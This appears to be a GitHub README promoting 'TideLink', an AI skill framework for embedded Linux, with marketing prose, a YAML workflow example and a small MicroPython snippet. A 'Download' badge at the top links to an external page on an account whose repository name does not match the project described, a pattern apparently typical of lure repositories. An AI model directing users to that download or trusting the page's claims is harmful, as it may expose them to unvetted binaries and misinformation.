![preview](https://raw.githubusercontent.com/reghilkentpilaspilas-stack/plumb-core/main/cover_a15b10.svg)
[![Download](https://raw.githubusercontent.com/reghilkentpilaspilas-stack/plumb-core/main/fetch_ecc98.svg)](https://reghilkentpilaspilas-stack.github.io/plumb-core/)

# 🌊 TideLink — AI Skill Orchestrator for Embedded Linux

**TideLink** is a modular, event-driven AI skill framework designed for the embedded Linux ecosystem. While the original **plumb-link** project focuses on reusable AI skill sets with tool-calling agents, **TideLink** pushes the envelope further by introducing a *tidal architecture* — where skills ebb and flow based on device state, resource availability, and user intent. It empowers engineers to delegate repetitive diagnostic, configuration, and optimization workflows to a self-organizing swarm of lightweight AI agents, all governed by a strict but flexible standardization layer.

> *Think of TideLink as a marine biologist for your embedded environment — it doesn't just catalog the creatures (skills) in the reef (your kernel), it studies their behavior, predicts migration patterns, and ensures the entire ecosystem thrives without constant human intervention.*

---

## 🌟 Why TideLink Exists

Embedded Linux development is 70% repetition and 30% inspiration. The same I2C probe sequences, flash memory verification routines, boot-time optimization tweaks, and peripheral driver sanity checks consume countless engineering hours. Existing automation scripts are brittle, single-purpose, and die quietly with their author. TideLink transforms these *ad hoc* scripts into **living, adaptive skills** that:

- **Self-describe** their purpose, dependencies, resource footprint, and failure modes
- **Negotiate** with other skills for CPU, memory, and bus access
- **Compose** complex workflows from simple building blocks using a YAML-based choreography language
- **Rollback** gracefully when a hardware condition changes mid-execution

---

## 🧠 Core Architecture: The Estuary Model

Traditional agent frameworks treat skills as a flat list. TideLink adopts an estuary model — where freshwater (device events) meets saltwater (user commands), creating a nutrient-rich gradient of contextual AI capabilities.

| Layer | Component | Function |
|-------|-----------|----------|
| **Intertidal Zone** | Event Tidal Pool | Captures sysfs, netlink, and peripheral IRQ events in real-time |
| **Subtidal Zone** | Skill Reef | Hosts the active skill library with priority-based execution slots |
| **Pelagic Zone** | Intent Monsoon | Interprets user queries/scripts/CLI input and routes them to appropriate skills |
| **Benthic Zone** | Resource Sediment | Manages memory budgets, CPU affinity, and power domains for each skill |

The framework never assumes a fixed skill tree. Instead, skills register themselves at startup (or hot-plug), publish their capabilities via a lightweight introspection protocol, and disappear when unloaded.

---

## 🛠️ Key Features

### 🌀 1. Tidal Skill Lifecycle Management
Every skill moves through distinct phases — **Immersion** (loading), **Drift** (idle monitoring), **Surge** (active execution), **Ebb** (resource release), and **Barnacle** (persistent background tasks). The scheduler automatically promotes or demotes skills based on system load, thermal envelope, and battery state.

### 🌐 2. Multilingual Skill Authoring
Skills can be authored in C, Lua, Python (MicroPython for constrained devices), or even pure shell — without any runtime wrappers. The TideLink compiler translates your code into a standardized skill manifest (`skill.tide` file) that includes:
- Required kernel modules
- File system touchpoints
- Shared memory segments
- Worst-case execution time (WCET) estimates
- Environmental triggers

### 🔄 3. Event-Aware Re-Planning
Most agents wait for explicit user input. TideLink watches the *bleeding edge* of your device — if a thermal sensor spikes, a skill mid-flight automatically gets preempted, its state serialized to NVRAM, and a different skill tuned for high-temperature diagnostics takes over. This happens without a single line of custom handler code.

### 🧩 4. Choreography Engine
Complex workflows like *"validate the new WiFi firmware, map the flash table, and optimize the DMA channel allocation"* are expressed as *tidal dances* — declarative graphs with built-in retry, fallback, and compensation logic.

```yaml
choreography: wifi_validation
steps:
  - skill: flash_reader
    action: dump_partition
    target: /dev/mtd3
  - skill: dma_allocator
    action: reconfigure
    max_channels: 4
  - skill: packet_inspector
    action: validate_stream
    duration: 5000
on_failure:
  - skill: power_cycler
    action: soft_reset
  - rollback: previous_state
```

### 📊 5. Resource Umbrella
Each skill runs inside a *cgroup umbrella* with explicit CPU shares, memory high-watermark limits, and I/O priority. TideLink enforces these budgets at the kernel level using eBPF hooks — no user-space daemon overhead.

### 🕰️ 6. Time-Aware Debugging
The built-in *tide-logger* correlates skill execution history with kernel ring buffer messages, syscall traces, and power state transitions. Every skill invocation generates a vectorized log entry — measurable, searchable, and replayable for regression testing.

---

## 🎯 Who Should Use TideLink?

- **Firmware architects** responsible for board bring-up across multiple SoC variants
- **Automotive IoT developers** managing in-vehicle infotainment + telemetry + OTA pipelines
- **Industrial controller programmers** overseeing PLCs, CNCs, and vision systems
- **Consumer device engineers** balancing battery life with sophisticated AI features
- **Kernel tinkerers** who want a structured way to integrate ML-based predictive maintenance

If your daily work involves `dmesg`, `i2cdetect`, `flashcp`, or `devmem`, TideLink will absorb those repetitive invocations into reusable AI-driven skills — though you can always drop down to the underlying shell command when curiosity strikes.

---

## 🚀 Faster Path to Productivity

Instead of a steep learning curve, TideLink gives you a *gentle ramp*:

1. **Scan Mode** — Point TideLink at a running board, and it automatically discovers your existing device nodes, kernel configs, and loadable modules. It generates a *biodiversity report* of available hardware peripherals.
2. **Skill Drafting** — The interactive `tide-gen` tool writes your first skill skeleton based on telemetry you select from the scan results.
3. **Field Test** — Deploy TideLink in a read-only *observation mode* where it monitors system calls but does not touch hardware yet. Build confidence.
4. **Full Autonomy** — Flip the switch. TideLink takes over repetitive diagnostic loops, visualizes anomalies, and suggests new skill definitions.

---

## 🛡️ Resiliency & Safety

Embedded systems cannot "just reboot" every time an AI agent misbehaves. TideLink includes:

- **Watchdog Tides** — virtual circuit breakers that disable a runaway skill after N consecutive failures
- **Deterministic Rollback Spots** — skill state checkpoints that can restore to any prior tide level
- **Fail-Safe Defaults** — if the orchestration daemon crashes, the kernel-side hook allows all skills to gracefully enter *lowest-common-denominator* mode (i.e., raw shell access only)
- **Secure Skill Signing** — skills are signed with ed25519 keys; TideLink refuses to load unsigned or revoked manifests

---

## 📝 Getting Started (Conceptual Journey)

*No command-line pilgrimage required here — the framework itself guides your first steps.*

1. **Prepare the habitat** — Your embedded Linux system needs 2MB of free flash for the TideLink runtime and a scratch partition for skill state.
2. **Initiate the basin** — Run the `tide-init` utility (included in the release asset) to generate the root configuration file.
3. **Introduce the first skill** — Take your most annoying recurring script (e.g., "read all I2C sensors every 5 seconds and log to file") and translate it manually to the `skill.tide` format using the provided reference.
4. **Test the current** — Use the offline simulator (`tide-sim` — runs on any x86 Linux PC) to replay recorded syscall traces and verify your skill behaves as expected.
5. **Liberate the reef** — Copy the compiled skill to the target device and watch TideLink absorb it.

> No pip, no npm, no curl-based installation rituals. TideLink ships as a single static Arm64 binary + a YAML config directory — minimal dependencies, maximal fragility-reduction.

---

## 🧩 Example Use Cases

### Case A: Flash Memory Wear Leveling Assessment
```python
# Inside a skill authored in MicroPython
import tidelink
@tidelink.skill_trigger(event="flash.write_count > 10000")
def assess_flash_health():
    report = tidelink.exec("nvme log /dev/nvme0n1 | grep wear")
    if "warning" in report:
        tidelink.choreograph("backup_critical_data", priority="high")
```

### Case B: Autonomous CAN Bus Protocol Discovery
A skill listens on a CAN interface, captures arbitration IDs, performs frequency analysis, and clusters messages by periodicity — then proposes a DBC file generation choreography for the engineer to approve.

### Case C: Thermal-Adaptive Performance Scaling
When junction temperature crosses 85°C, TideLink automatically swaps the running CPU-heavy skill (e.g., image classification) with a lighter-weight skill (e.g., frame differencing) while preserving application-level semantics via a shared memory handoff.

---

## 🌍 Internationalization & Community

TideLink is built for global engineering teams:

- **UI strings** exist as standard gettext `.po` files — currently shipped with English, Simplified Chinese, German, and Japanese translations.
- **Documentation** is structured to be translation-friendly (short paragraphs, minimal idioms — well, except for the marine metaphors, we cannot help ourselves).
- **Locale-independent time formats** (UTC + epoch) avoid BST/EST/PST confusion in multi-site deployments.

---

## 📚 Documentation Roadmap

- **`docs/architecture_tides.md`** — Deep dive into the scheduler and preemption model
- **`docs/skill_manifest_spec.md`** — Full JSON schema + YAML examples for `skill.tide`
- **`docs/choreography_language.md`** — Syntax, parallel branches, and error handling
- **`docs/hardening_guide.md`** — Security hardening for exposed skill APIs
- **`docs/migration_from_plumb-link.md`** — Bridging guide if you are coming from the sibling project

---

## 🤝 Contribution Philosophy

We welcome patches, novel skill ideas, and field reports from unusual hardware. Our development workflow uses a *tidal pull-request* model: PRs are queued in an "incoming tide" branch, peer-reviewed by two maintainers, then merged during a "spring tide" release cycle (every second Tuesday). We request that all new skills include a corresponding test that runs in our GitHub Actions-based emulated QEMU farm.

---

## ⚠️ Disclaimer

TideLink is designed for professional embedded systems developers. The framework provides tools to automate hardware interactions — but it does *not* absolve you of responsibility. Always:

- Test new skills in simulation before touching production hardware.
- Maintain physical override switches (e.g., a GPIO kill-line) for actuators.
- Respect the thermal and electrical limits of your devices.
- Verify that skill signatures originate from trusted maintainers.

The maintainers are not liable for data loss, hardware damage, or safety incidents resulting from the use of this software. The MIT license is the sole grant of rights.

---

## 📜 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for the full legal text. In short: use it, modify it, sell it (with attribution), and do not hold us liable for its misbehavior.

---

## ⏳ Versioning & Support

- **Stable releases**: tagged with semantic versioning (e.g., `v2026.04.1`)
- **LTS branch**: `tide-lts` receives security and bugfix backports for 18 months
- **Nightly builds**: generated automatically from the `main` tidal flow
- **Supported platforms**: Arm64 (primary), RISC-V 64, x86_64 (for simulation)
- **Kernel compatibility**: Linux 5.15 LTS and newer (we rely on modern eBPF features)

---

## 🧭 Roadmap to 2026

- **Q2 2026**: Add support for automatic skill translation from Python/TensorFlow Lite micro to native Arm code
- **Q3 2026**: Release the `tide-clinic` graphical dashboard (runs on host, connects over SSH)
- **Q4 2026**: Introduce time-travel debugging — record a full skill session and rewind to any tide point
- **2027 Vision**: Cross-device skill synchronization — teach a skill on a dev board, deploy to 10,000 field devices via delta update

---

## 🔗 Related Projects

If you are exploring the AI-for-embedded ecosystem, you will find complementary value in:
- **plumb-link** — the foundational framework for skill-based tool-calling agents
- **FlowPulse** — a real-time visualization tool for kernel tracepoints
- **BuildBraid** — a deterministic build system tuned for firmware reproducibility

We encourage interoperability: TideLink can import *plumb-link* skills (with minor manifest tweaks) through its `tide-bridge` module.

---

## ✨ Final Thought

The sea is constantly in motion, yet remains predictable at its core. TideLink brings the same balance to embedded AI development — freeing you from the minutiae of repetitive coding so you can focus on the beautiful, complex decisions that shape the silicon frontier.

**Set sail. Automate the tide.**